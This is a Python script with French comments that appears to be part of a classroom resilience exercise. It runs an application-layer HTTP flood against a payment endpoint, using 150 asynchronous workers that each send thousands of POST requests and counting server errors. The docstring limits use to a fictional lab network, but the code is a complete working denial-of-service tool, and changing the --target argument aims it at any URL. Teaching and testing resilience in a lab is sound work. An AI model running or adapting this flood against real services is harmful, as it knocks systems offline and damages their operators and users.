"""
Scénario d'attaque — déni de service applicatif (flood HTTP sur /pay).
À LANCER DEPUIS LE PC ATTAQUANT, jamais depuis le PC Hôte.

Périmètre STRICT : uniquement votre SI fictif sur le réseau RESILIENCE-G<n>.
Jamais le réseau du campus, un autre groupe ou un service tiers.

Usage :
    pip install aiohttp
    python ddos.py --target http://192.168.137.1:8080/pay --workers 150 --burst 4000
"""
import argparse
import asyncio
import time

import aiohttp


async def flood(session, url, burst, counters):
    for _ in range(burst):
        try:
            async with session.post(url, params={"amount": 1}) as resp:
                counters["sent"] += 1
                if resp.status >= 500:
                    counters["err"] += 1
        except Exception:
            counters["fail"] += 1


async def main(url, workers, burst):
    counters = {"sent": 0, "err": 0, "fail": 0}
    print(f"== Flood HTTP sur {url} ({workers} workers x {burst}) ==")
    start = time.time()
    conn = aiohttp.TCPConnector(limit=0, ssl=False)
    async with aiohttp.ClientSession(connector=conn) as s:
        await asyncio.gather(*[flood(s, url, burst, counters) for _ in range(workers)])
    dur = time.time() - start
    print(f"Terminé en {dur:.1f}s — envoyées={counters['sent']} "
          f"5xx={counters['err']} échecs_connexion={counters['fail']}")


if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--target", default="http://192.168.137.1:8080/pay")
    p.add_argument("--workers", type=int, default=150)
    p.add_argument("--burst", type=int, default=4000)
    args = p.parse_args()
    asyncio.run(main(args.target, args.workers, args.burst))
